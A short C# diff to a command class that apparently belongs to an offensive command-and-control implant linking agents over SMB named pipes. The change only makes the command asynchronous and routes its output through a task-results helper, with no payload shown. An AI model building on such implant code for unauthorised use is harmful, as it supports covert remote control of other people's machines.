@@ -7,6 +7,7 @@ using System.Text;
 using System.Threading.Tasks;
 using System.IO;
 using System.IO.Pipes;
+using Engineer.Functions;
 
 namespace Engineer.Commands
 {
@@ -17,7 +18,7 @@ namespace Engineer.Commands
         public EngSMBComm ParentSMBcommModule { get; set; }
         public bool ParentIsServer { get; set; }
 
-        public override string Execute(EngineerTask task)
+        public override async Task Execute(EngineerTask task)
         {
             task.Arguments.TryGetValue("/pipe", out var namedPipe);
             task.Arguments.TryGetValue("/ip", out var serverip);
@@ -55,7 +56,7 @@ namespace Engineer.Commands
             {
                 System.Threading.Thread.Sleep(20);
             }
-            return Output;
+            Tasking.FillTaskResults(Output,task,EngTaskStatus.Complete);
         }
     }
 }
